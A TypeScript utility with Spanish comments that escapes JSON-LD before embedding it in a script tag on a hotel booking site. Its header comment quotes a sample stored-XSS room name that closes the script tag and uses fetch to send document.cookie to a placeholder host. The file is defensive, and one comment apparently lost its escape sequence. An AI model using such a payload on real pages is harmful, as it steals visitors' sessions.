// Serialización de JSON-LD para meter dentro de un <script>.
//
// El navegador NO parsea el contenido de un `<script>` como JSON: primero busca
// el `</script>` que lo cierra. Así que si un dato del JSON contiene la cadena
// `</script>`, el bloque termina AHÍ y todo lo que venga después se interpreta
// como HTML de la página.
//
// El ataque concreto (K-18.1): un hotelero pone como nombre de una habitación
//
//     Suite Jungla</script><script>fetch('https://sitio/?c='+document.cookie)</script>
//
// y ese texto sale tal cual en el JSON-LD de su página pública, que Kora sirve
// desde `kora-hotel.com`. El script inyectado corre en NUESTRO dominio, con la
// sesión de quien esté mirando — y el nombre de la habitación lo escribe el
// hotelero desde su panel, sin pasar por nadie.
//
// La defensa es escapar `<` como `<`. Dentro de una cadena JSON eso es
// exactamente el mismo carácter —Google lo lee igual— pero el navegador ya no ve
// una etiqueta que cerrar.

/**
 * Convierte el objeto en el texto que va dentro de
 * `<script type="application/ld+json">`.
 *
 * Los únicos `<`, `>` y `&` que puede haber en la salida de `JSON.stringify`
 * están DENTRO de cadenas (la estructura sólo usa `{}[]",:`), así que sustituirlos
 * en todo el texto es seguro y no cambia lo que un lector de JSON entiende.
 */
export function serializarJsonLd(data: unknown): string {
  return JSON.stringify(data)
    .replace(/</g, "\\u003c") // el que cierra el <script>: el importante
    .replace(/>/g, "\\u003e") // por si acaso, y para que no quede a medias
    .replace(/&/g, "\\u0026") // evita que el HTML resuelva entidades dentro
    // U+2028 y U+2029 son saltos de línea para JavaScript aunque JSON los
    // acepte crudos. No rompen un `ld+json`, pero sí romperían el día que este
    // mismo texto acabe pegado en otro sitio.
    .replace(/\u2028/g, "\\u2028")
    .replace(/\u2029/g, "\\u2029");
}
